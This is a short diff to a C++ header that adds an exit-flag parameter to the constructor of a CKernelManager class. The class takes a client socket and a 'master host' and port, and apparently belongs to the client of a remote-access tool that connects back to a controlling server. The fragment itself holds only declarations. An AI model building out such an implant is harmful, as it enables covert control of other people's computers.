@@ -14,7 +14,7 @@ class CKernelManager : public CManager
 {
 public:
     CKernelManager(CClientSocket *pClient,
-                   LPCSTR lpszMasterHost, UINT nMasterPort);
+                   LPCSTR lpszMasterHost, UINT nMasterPort, BOOL &bExit);
     virtual ~CKernelManager();
     virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
     static	char	m_strMasterHost[256];
